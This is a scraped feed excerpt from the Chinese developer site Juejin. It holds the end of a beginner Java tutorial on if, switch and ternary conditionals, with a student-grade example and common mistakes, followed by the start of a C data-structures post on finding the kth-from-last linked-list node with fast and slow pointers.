        
        <span class="hljs-comment">// 语法：条件 ? 值1 : 值2</span>
        <span class="hljs-comment">// 如果条件为true，返回值1，否则返回值2</span>
        
        <span class="hljs-comment">// 示例1：找出两个数中的较大值</span>
        <span class="hljs-type">int</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-number">10</span>;
        <span class="hljs-type">int</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> <span class="hljs-number">20</span>;
        <span class="hljs-type">int</span> <span class="hljs-variable">max</span> <span class="hljs-operator">=</span> (a &gt; b) ? a : b;
        System.out.println(a + <span class="hljs-string">"和"</span> + b + <span class="hljs-string">"中较大的数是："</span> + max);
        
        <span class="hljs-comment">// 示例2：判断奇偶数</span>
        <span class="hljs-type">int</span> <span class="hljs-variable">number</span> <span class="hljs-operator">=</span> <span class="hljs-number">7</span>;
        <span class="hljs-type">String</span> <span class="hljs-variable">parity</span> <span class="hljs-operator">=</span> (number % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>) ? <span class="hljs-string">"偶数"</span> : <span class="hljs-string">"奇数"</span>;
        System.out.println(number + <span class="hljs-string">"是"</span> + parity);
        
        <span class="hljs-comment">// 示例3：根据成绩判断是否及格</span>
        <span class="hljs-type">int</span> <span class="hljs-variable">score</span> <span class="hljs-operator">=</span> <span class="hljs-number">75</span>;
        <span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> (score &gt;= <span class="hljs-number">60</span>) ? <span class="hljs-string">"及格"</span> : <span class="hljs-string">"不及格"</span>;
        System.out.println(<span class="hljs-string">"成绩"</span> + score + <span class="hljs-string">"分："</span> + result);
        
        <span class="hljs-comment">// 示例4：嵌套三元运算符（不推荐太复杂）</span>
        <span class="hljs-type">int</span> <span class="hljs-variable">x</span> <span class="hljs-operator">=</span> <span class="hljs-number">10</span>;
        <span class="hljs-type">int</span> <span class="hljs-variable">y</span> <span class="hljs-operator">=</span> <span class="hljs-number">20</span>;
        <span class="hljs-type">int</span> <span class="hljs-variable">z</span> <span class="hljs-operator">=</span> <span class="hljs-number">15</span>;
        
        <span class="hljs-comment">// 找出三个数中的最大值</span>
        <span class="hljs-type">int</span> <span class="hljs-variable">largest</span> <span class="hljs-operator">=</span> (x &gt; y) ? ((x &gt; z) ? x : z) : ((y &gt; z) ? y : z);
        System.out.println(x + <span class="hljs-string">","</span> + y + <span class="hljs-string">","</span> + z + <span class="hljs-string">"中最大的数是："</span> + largest);
        
        <span class="hljs-comment">// 示例5：实际应用场景</span>
        <span class="hljs-type">boolean</span> <span class="hljs-variable">isMember</span> <span class="hljs-operator">=</span> <span class="hljs-literal">true</span>;
        <span class="hljs-type">double</span> <span class="hljs-variable">totalAmount</span> <span class="hljs-operator">=</span> <span class="hljs-number">1000.0</span>;
        
        <span class="hljs-comment">// 会员享受9折，非会员原价</span>
        <span class="hljs-type">double</span> <span class="hljs-variable">finalAmount</span> <span class="hljs-operator">=</span> isMember ? totalAmount * <span class="hljs-number">0.9</span> : totalAmount;
        System.out.println(<span class="hljs-string">"会员状态："</span> + (isMember ? <span class="hljs-string">"是会员"</span> : <span class="hljs-string">"非会员"</span>));
        System.out.println(<span class="hljs-string">"应付金额："</span> + finalAmount + <span class="hljs-string">"元"</span>);
    }
}
</code></pre>
<h2 data-id="heading-7">5.综合实战：学生成绩管理系统</h2>
<pre><code class="hljs language-Java" lang="Java"><span class="hljs-keyword">import</span> java.util.Scanner;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">StudentGradeSystem</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-type">Scanner</span> <span class="hljs-variable">scanner</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(System.in);
        
        System.out.println(<span class="hljs-string">"=== 学生成绩管理系统 ==="</span>);
        
        <span class="hljs-comment">// 输入学生信息</span>
        System.out.print(<span class="hljs-string">"请输入学生姓名："</span>);
        <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> scanner.nextLine();
        
        System.out.print(<span class="hljs-string">"请输入学生年龄："</span>);
        <span class="hljs-type">int</span> <span class="hljs-variable">age</span> <span class="hljs-operator">=</span> scanner.nextInt();
        
        System.out.print(<span class="hljs-string">"请输入语文成绩："</span>);
        <span class="hljs-type">int</span> <span class="hljs-variable">chinese</span> <span class="hljs-operator">=</span> scanner.nextInt();
        
        System.out.print(<span class="hljs-string">"请输入数学成绩："</span>);
        <span class="hljs-type">int</span> <span class="hljs-variable">math</span> <span class="hljs-operator">=</span> scanner.nextInt();
        
        System.out.print(<span class="hljs-string">"请输入英语成绩："</span>);
        <span class="hljs-type">int</span> <span class="hljs-variable">english</span> <span class="hljs-operator">=</span> scanner.nextInt();
        
        <span class="hljs-comment">// 计算总分和平均分</span>
        <span class="hljs-type">int</span> <span class="hljs-variable">total</span> <span class="hljs-operator">=</span> chinese + math + english;
        <span class="hljs-type">double</span> <span class="hljs-variable">average</span> <span class="hljs-operator">=</span> total / <span class="hljs-number">3.0</span>;
        
        <span class="hljs-comment">// 判断各科是否及格</span>
        <span class="hljs-type">boolean</span> <span class="hljs-variable">chinesePass</span> <span class="hljs-operator">=</span> chinese &gt;= <span class="hljs-number">60</span>;
        <span class="hljs-type">boolean</span> <span class="hljs-variable">mathPass</span> <span class="hljs-operator">=</span> math &gt;= <span class="hljs-number">60</span>;
        <span class="hljs-type">boolean</span> <span class="hljs-variable">englishPass</span> <span class="hljs-operator">=</span> english &gt;= <span class="hljs-number">60</span>;
        
        <span class="hljs-comment">// 判断总体是否及格（所有科目都及格）</span>
        <span class="hljs-type">boolean</span> <span class="hljs-variable">allPass</span> <span class="hljs-operator">=</span> chinesePass &amp;&amp; mathPass &amp;&amp; englishPass;
        
        <span class="hljs-comment">// 判断是否有科目不及格</span>
        <span class="hljs-type">boolean</span> <span class="hljs-variable">anyFail</span> <span class="hljs-operator">=</span> !chinesePass || !mathPass || !englishPass;
        
        <span class="hljs-comment">// 判断优秀科目（90分以上）</span>
        <span class="hljs-type">int</span> <span class="hljs-variable">excellentCount</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
        <span class="hljs-keyword">if</span> (chinese &gt;= <span class="hljs-number">90</span>) excellentCount++;
        <span class="hljs-keyword">if</span> (math &gt;= <span class="hljs-number">90</span>) excellentCount++;
        <span class="hljs-keyword">if</span> (english &gt;= <span class="hljs-number">90</span>) excellentCount++;
        
        <span class="hljs-comment">// 判断总体等级</span>
        String overallGrade;
        <span class="hljs-keyword">if</span> (average &gt;= <span class="hljs-number">90</span>) {
            overallGrade = <span class="hljs-string">"优秀"</span>;
        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (average &gt;= <span class="hljs-number">80</span>) {
            overallGrade = <span class="hljs-string">"良好"</span>;
        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (average &gt;= <span class="hljs-number">70</span>) {
            overallGrade = <span class="hljs-string">"中等"</span>;
        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (average &gt;= <span class="hljs-number">60</span>) {
            overallGrade = <span class="hljs-string">"及格"</span>;
        } <span class="hljs-keyword">else</span> {
            overallGrade = <span class="hljs-string">"不及格"</span>;
        }
        
        <span class="hljs-comment">// 输出结果</span>
        System.out.println(<span class="hljs-string">"\n=== 成绩报告 ==="</span>);
        System.out.println(<span class="hljs-string">"姓名："</span> + name);
        System.out.println(<span class="hljs-string">"年龄："</span> + age);
        System.out.println(<span class="hljs-string">"总分："</span> + total);
        System.out.println(<span class="hljs-string">"平均分："</span> + String.format(<span class="hljs-string">"%.2f"</span>, average));
        System.out.println(<span class="hljs-string">"总体等级："</span> + overallGrade);
        
        System.out.println(<span class="hljs-string">"\n=== 各科情况 ==="</span>);
        System.out.println(<span class="hljs-string">"语文："</span> + chinese + <span class="hljs-string">"分 - "</span> + (chinesePass ? <span class="hljs-string">"及格"</span> : <span class="hljs-string">"不及格"</span>));
        System.out.println(<span class="hljs-string">"数学："</span> + math + <span class="hljs-string">"分 - "</span> + (mathPass ? <span class="hljs-string">"及格"</span> : <span class="hljs-string">"不及格"</span>));
        System.out.println(<span class="hljs-string">"英语："</span> + english + <span class="hljs-string">"分 - "</span> + (englishPass ? <span class="hljs-string">"及格"</span> : <span class="hljs-string">"不及格"</span>));
        
        System.out.println(<span class="hljs-string">"\n=== 综合分析 ==="</span>);
        <span class="hljs-keyword">if</span> (allPass) {
            System.out.println(<span class="hljs-string">"恭喜！所有科目都及格了！"</span>);
        } <span class="hljs-keyword">else</span> {
            System.out.println(<span class="hljs-string">"注意：有科目不及格，需要加强学习！"</span>);
        }
        
        <span class="hljs-keyword">if</span> (excellentCount &gt; <span class="hljs-number">0</span>) {
            System.out.println(<span class="hljs-string">"有"</span> + excellentCount + <span class="hljs-string">"门科目达到优秀！"</span>);
        }
        
        <span class="hljs-keyword">if</span> (average &gt;= <span class="hljs-number">90</span>) {
            System.out.println(<span class="hljs-string">"平均分达到优秀，表现非常出色！"</span>);
        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (average &gt;= <span class="hljs-number">80</span>) {
            System.out.println(<span class="hljs-string">"平均分良好，继续保持！"</span>);
        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (average &gt;= <span class="hljs-number">60</span>) {
            System.out.println(<span class="hljs-string">"平均分及格，还有提升空间！"</span>);
        } <span class="hljs-keyword">else</span> {
            System.out.println(<span class="hljs-string">"平均分不及格，需要加倍努力！"</span>);
        }
        
        <span class="hljs-comment">// 根据情况给出建议</span>
        System.out.println(<span class="hljs-string">"\n=== 学习建议 ==="</span>);
        <span class="hljs-keyword">if</span> (!chinesePass) {
            System.out.println(<span class="hljs-string">"语文需要加强，建议多阅读多练习！"</span>);
        }
        
        <span class="hljs-keyword">if</span> (!mathPass) {
            System.out.println(<span class="hljs-string">"数学需要加强，建议多做练习题！"</span>);
        }
        
        <span class="hljs-keyword">if</span> (!englishPass) {
            System.out.println(<span class="hljs-string">"英语需要加强，建议多背单词多听多说！"</span>);
        }
        
        <span class="hljs-keyword">if</span> (chinese &gt;= <span class="hljs-number">90</span> &amp;&amp; math &gt;= <span class="hljs-number">90</span> &amp;&amp; english &gt;= <span class="hljs-number">90</span>) {
            System.out.println(<span class="hljs-string">"所有科目都非常优秀，继续保持！"</span>);
        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (average &gt;= <span class="hljs-number">80</span>) {
            System.out.println(<span class="hljs-string">"总体表现良好，继续努力争取更好成绩！"</span>);
        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (average &gt;= <span class="hljs-number">60</span>) {
            System.out.println(<span class="hljs-string">"基础尚可，需要查漏补缺！"</span>);
        } <span class="hljs-keyword">else</span> {
            System.out.println(<span class="hljs-string">"需要全面加强学习，制定详细学习计划！"</span>);
        }
        
        scanner.close();
    }
}
</code></pre>
<h2 data-id="heading-8">7.常见错误和注意事项</h2>
<h3 data-id="heading-9">错误示例：</h3>
<pre><code class="hljs language-Java" lang="Java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CommonMistakes</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        System.out.println(<span class="hljs-string">"=== 常见错误示例 ==="</span>);
        
        <span class="hljs-comment">// 错误1：条件后面直接跟分号</span>
        <span class="hljs-type">int</span> <span class="hljs-variable">score</span> <span class="hljs-operator">=</span> <span class="hljs-number">85</span>;
        <span class="hljs-comment">// if (score &gt;= 60);  // ❌ 错误：分号结束了if语句</span>
        <span class="hljs-comment">// {</span>
        <span class="hljs-comment">//     System.out.println("及格");  // 这行总是会执行，不在if控制范围内</span>
        <span class="hljs-comment">// }</span>
        
        <span class="hljs-comment">// 正确做法：</span>
        <span class="hljs-keyword">if</span> (score &gt;= <span class="hljs-number">60</span>) {  <span class="hljs-comment">// ✅ 正确：没有分号</span>
            System.out.println(<span class="hljs-string">"及格"</span>);
        }
        
        <span class="hljs-comment">// 错误2：比较字符串用==</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">str1</span> <span class="hljs-operator">=</span> <span class="hljs-string">"hello"</span>;
        <span class="hljs-type">String</span> <span class="hljs-variable">str2</span> <span class="hljs-operator">=</span> <span class="hljs-string">"hello"</span>;
        <span class="hljs-comment">// if (str1 == str2) {  // ❌ 可能正确也可能错误，不要用==比较字符串内容</span>
        <span class="hljs-comment">//     System.out.println("相等");</span>
        <span class="hljs-comment">// }</span>
        
        <span class="hljs-comment">// 正确做法：</span>
        <span class="hljs-keyword">if</span> (str1.equals(str2)) {  <span class="hljs-comment">// ✅ 正确：用equals比较字符串内容</span>
            System.out.println(<span class="hljs-string">"相等"</span>);
        }
        
        <span class="hljs-comment">// 错误3：switch忘记写break</span>
        <span class="hljs-type">int</span> <span class="hljs-variable">day</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>;
        <span class="hljs-keyword">switch</span> (day) {
            <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:
                System.out.println(<span class="hljs-string">"周一"</span>);
                <span class="hljs-comment">// ❌ 忘记写break，会"穿透"到case 2</span>
            <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:
                System.out.println(<span class="hljs-string">"周二"</span>);
                <span class="hljs-keyword">break</span>;
        }
        <span class="hljs-comment">// 输出结果会是：</span>
        <span class="hljs-comment">// 周一</span>
        <span class="hljs-comment">// 周二</span>
        
        <span class="hljs-comment">// 正确做法：</span>
        <span class="hljs-keyword">switch</span> (day) {
            <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:
                System.out.println(<span class="hljs-string">"周一"</span>);
                <span class="hljs-keyword">break</span>;  <span class="hljs-comment">// ✅ 记得写break</span>
            <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:
                System.out.println(<span class="hljs-string">"周二"</span>);
                <span class="hljs-keyword">break</span>;
        }
        
        <span class="hljs-comment">// 错误4：浮点数直接用==比较</span>
        <span class="hljs-type">double</span> <span class="hljs-variable">d1</span> <span class="hljs-operator">=</span> <span class="hljs-number">0.1</span> + <span class="hljs-number">0.2</span>;
        <span class="hljs-type">double</span> <span class="hljs-variable">d2</span> <span class="hljs-operator">=</span> <span class="hljs-number">0.3</span>;
        <span class="hljs-comment">// if (d1 == d2) {  // ❌ 错误：浮点数精度问题，可能不相等</span>
        <span class="hljs-comment">//     System.out.println("相等");</span>
        <span class="hljs-comment">// }</span>
        
        <span class="hljs-comment">// 正确做法：</span>
        <span class="hljs-keyword">if</span> (Math.abs(d1 - d2) &lt; <span class="hljs-number">0.000001</span>) {  <span class="hljs-comment">// ✅ 正确：判断差值是否足够小</span>
            System.out.println(<span class="hljs-string">"相等"</span>);
        }
    }
}
</code></pre>
<h3 data-id="heading-10">最佳实践：</h3>
<pre><code class="hljs language-Java" lang="Java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BestPractices</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        System.out.println(<span class="hljs-string">"=== 最佳实践 ==="</span>);
        
        <span class="hljs-comment">// 1. 使用括号明确优先级</span>
        <span class="hljs-type">int</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-number">10</span>, b = <span class="hljs-number">20</span>, c = <span class="hljs-number">30</span>;
        
        <span class="hljs-comment">// 不明确的做法：</span>
        <span class="hljs-comment">// if (a &gt; b &amp;&amp; b &gt; c || c &gt; a)  // 优先级不清晰</span>
        
        <span class="hljs-comment">// 明确的做法：</span>
        <span class="hljs-keyword">if</span> ((a &gt; b &amp;&amp; b &gt; c) || (c &gt; a)) {  <span class="hljs-comment">// 使用括号明确优先级</span>
            System.out.println(<span class="hljs-string">"条件成立"</span>);
        }
        
        <span class="hljs-comment">// 2. 避免过深的嵌套</span>
        <span class="hljs-comment">// 不好的做法：</span>
        <span class="hljs-comment">// if (condition1) {</span>
        <span class="hljs-comment">//     if (condition2) {</span>
        <span class="hljs-comment">//         if (condition3) {</span>
        <span class="hljs-comment">//             // 太多层嵌套，难以阅读</span>
        <span class="hljs-comment">//         }</span>
        <span class="hljs-comment">//     }</span>
        <span class="hljs-comment">// }</span>
        
        <span class="hljs-comment">// 好的做法：使用逻辑运算符合并条件</span>
        <span class="hljs-type">boolean</span> <span class="hljs-variable">condition1</span> <span class="hljs-operator">=</span> <span class="hljs-literal">true</span>, condition2 = <span class="hljs-literal">true</span>, condition3 = <span class="hljs-literal">true</span>;
        <span class="hljs-keyword">if</span> (condition1 &amp;&amp; condition2 &amp;&amp; condition3) {
            System.out.println(<span class="hljs-string">"所有条件都满足"</span>);
        }
        
        <span class="hljs-comment">// 3. 复杂判断使用临时变量</span>
        <span class="hljs-type">int</span> <span class="hljs-variable">age</span> <span class="hljs-operator">=</span> <span class="hljs-number">20</span>;
        <span class="hljs-type">boolean</span> <span class="hljs-variable">hasLicense</span> <span class="hljs-operator">=</span> <span class="hljs-literal">true</span>;
        <span class="hljs-type">boolean</span> <span class="hljs-variable">isSober</span> <span class="hljs-operator">=</span> <span class="hljs-literal">true</span>;
        
        <span class="hljs-comment">// 不推荐：</span>
        <span class="hljs-comment">// if (age &gt;= 18 &amp;&amp; hasLicense &amp;&amp; isSober) {</span>
        
        <span class="hljs-comment">// 推荐：使用临时变量提高可读性</span>
        <span class="hljs-type">boolean</span> <span class="hljs-variable">canDrive</span> <span class="hljs-operator">=</span> age &gt;= <span class="hljs-number">18</span> &amp;&amp; hasLicense &amp;&amp; isSober;
        <span class="hljs-keyword">if</span> (canDrive) {
            System.out.println(<span class="hljs-string">"可以开车"</span>);
        }
        
        <span class="hljs-comment">// 4. switch使用default处理意外情况</span>
        <span class="hljs-type">int</span> <span class="hljs-variable">option</span> <span class="hljs-operator">=</span> <span class="hljs-number">5</span>;
        <span class="hljs-keyword">switch</span> (option) {
            <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:
                System.out.println(<span class="hljs-string">"选项1"</span>);
                <span class="hljs-keyword">break</span>;
            <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:
                System.out.println(<span class="hljs-string">"选项2"</span>);
                <span class="hljs-keyword">break</span>;
            <span class="hljs-keyword">default</span>:  <span class="hljs-comment">// 总是包含default处理意外输入</span>
                System.out.println(<span class="hljs-string">"无效选项"</span>);
        }
    }
}
</code></pre>
<h3 data-id="heading-11">三种判断方式对比：</h3>

























<table><thead><tr><th>方式</th><th>适用场景</th><th>特点</th></tr></thead><tbody><tr><td><code>if</code>语句</td><td>简单判断</td><td>最基本，最灵活</td></tr><tr><td><code>if-else</code>， <code>if-else</code></td><td>多重条件</td><td>处理多个互斥条件</td></tr><tr><td><code>switch</code>语句</td><td>多分支选择</td><td>处理固定值的选择，代码更清晰</td></tr></tbody></table>
<h2 data-id="heading-12">选择指南：</h2>
<ol>
<li><strong>只有一两个条件</strong> → 用<code>if</code>或<code>if-else</code></li>
<li><strong>多个互斥条件</strong> → 用<code>if-else</code> ，<code>if-else</code></li>
<li><strong>基于固定值的多分支</strong> → 用<code>switch</code></li>
<li><strong>简单的二选一</strong> → 考虑用三元运算符</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[数据结构（C语言版）线性表-单链表的拓展及应用]]></title>    <link>https://juejin.cn/post/7580329353352429614</link>    <guid>https://juejin.cn/post/7580329353352429614</guid>    <pubDate>2025-12-06T09:51:33.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7580329353352429614" data-draft-id="7580251192331321390" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="数据结构（C语言版）线性表-单链表的拓展及应用"/> <meta itemprop="keywords" content="强化学习,笔记"/> <meta itemprop="datePublished" content="2025-12-06T09:51:33.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="744"/> <meta itemprop="url" content="https://juejin.cn/user/4396267956867276"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            数据结构（C语言版）线性表-单链表的拓展及应用
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4396267956867276/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    744
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-06T09:51:33.000Z" title="Sat Dec 06 2025 09:51:33 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-06
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读11分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">单链表的应用</h2>
<h3 data-id="heading-1">练习1---用快慢指针找倒数第 k 个节点</h3>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1e6c3e99573440c6a5d680e04b056e84~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgNzQ0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765619492&amp;x-signature=GoEgDgvaPBAvw3eHis%2FKpHS2QbY%3D" alt="image-20251206092136309.png" loading="lazy"/></p>
<p>(1)算法的基本设计思想</p>
<blockquote>
<p>双指针：快慢指针</p>
<p>定义两个指针变量 fast 和 slow ，初始时均指向头结点的下一个结点（链表的第一个结点）。 fast指针沿链表移动：当 fast 指针移动到第 k 个结点时， fast 指针开始与 slow 指针同步移动：当 fast 指针移动到最后一个结点时， slow 指针所指示结点为倒数第 k 个结点。以上过程对链表仅进行一遍扫描。</p>
</blockquote>
<p>(2）算法的详细实现步骤</p>
<p>①fast 和 slow 指向链表表头结点的下一个结点；
②快指针提前走 k 步；                                                                                                                                                     ③快慢指针同步移动至快指针到末尾；                                                                                                                           ④ 输出该结点的 data 域的值，返回；
⑤算法结束</p>
<p>(3)关键算法：</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-type">int</span> <span class="hljs-title function_">findNodeFS</span><span class="hljs-params">(Node*L,<span class="hljs-type">int</span> k)</span> {

	Node* fast = L-&gt;link;
	Node* slow = L-&gt;link;

	<span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; k; i++)
	{
		fast = fast-&gt;link;
	}
	<span class="hljs-keyword">while</span> (fast != <span class="hljs-literal">NULL</span>)
	{
		fast = fast-&gt;link;
		slow = slow-&gt;link;
	}
	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"倒数第%d个节点值为%d\n"</span>, k, slow-&gt;data);
	<span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;
}
</code></pre>
<p>完整代码：</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span>

<span class="hljs-keyword">typedef</span> <span class="hljs-type">int</span> ElemType;

<span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span> {</span>
	ElemType data;
	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span>* <span class="hljs-title">link</span>;</span>
}Node;


<span class="hljs-comment">//初始化</span>
Node* <span class="hljs-title function_">initList</span><span class="hljs-params">()</span>
{
